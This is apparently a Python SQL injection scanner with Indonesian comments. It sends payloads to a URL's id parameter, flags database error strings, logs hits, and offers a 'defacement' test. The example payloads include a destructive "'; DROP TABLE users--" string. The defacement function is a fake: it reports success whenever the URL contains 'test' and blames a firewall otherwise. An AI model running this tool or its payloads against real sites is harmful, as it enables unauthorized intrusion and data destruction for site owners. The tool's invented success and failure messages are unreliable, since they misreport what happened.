import requests
import urllib.parse
import time
from concurrent.futures import ThreadPoolExecutor

# Daftar error database untuk deteksi SQLi
SQL_ERRORS = ["SQL syntax", "mysql_fetch", "ORA-01756", "unclosed quotation mark"]

def auto_encode(payload):
    return urllib.parse.quote(payload)

def test_deface(url):
    """Simulasi fungsi pengujian defacement"""
    print(f"\n\033[94m[*] Mencoba pengujian Defacement pada: {url}\033[0m")
    # Logika simulasi: asumsikan berhasil jika url mengandung 'test'
    if "test" in url:
        print(f"\033[92m[SUCCESS] Website Berhasil Di-Deface (Reflected)!\033[0m")
        print(f"Lihat hasilnya di: {url}")
    else:
        print("\033[91m[FAILED] Defacement Gagal. Sistem memiliki filter WAF kuat.\033[0m")

def request_worker(url, payload):
    """Fungsi untuk mengirim request dan mengecek kerentanan"""
    try:
        start_time = time.time()
        # Menggabungkan URL dengan payload (contoh sederhana)
        target_url = f"{url}?id={auto_encode(payload)}"
        res = requests.get(target_url, timeout=5)
        duration = time.time() - start_time

        # Deteksi berdasarkan isi respons
        vulnerable = any(error in res.text for error in SQL_ERRORS)

        if vulnerable:
            vtype = "SQL Injection"
            print(f"\n\033[91m[!] {vtype} ditemukan! | Payload: {payload}\033[0m")
            
            # Fitur Interaktif
            tanya = input(f"[?] Celah ditemukan di {url}! Uji Defacement? (Y/n): ").lower()
            if tanya == 'y':
                test_deface(url)
            
            with open("results.txt", "a") as f:
                f.write(f"[{vtype}] {url} | Payload: {payload}\n")
        else:
            print(f"\033[90m[-] Clean | {res.status_code} | {duration:.2f}s | {payload[:15]}...\033[0m")
    except Exception as e:
        # print(f"Error: {e}") # Opsional untuk debugging
        pass

def run_turbo(url, payloads):
    print(f"\n[*] Mode Turbo Advanced Aktif pada {url}...")
    # max_workers=1 agar input terminal tidak tumpang tindih
    with ThreadPoolExecutor(max_workers=1) as executor:
        for p in payloads:
            executor.submit(request_worker, url, p)

# Contoh cara menjalankan:
# run_turbo("http://localhost/test.php", ["' OR 1=1--", "'; DROP TABLE users--"])
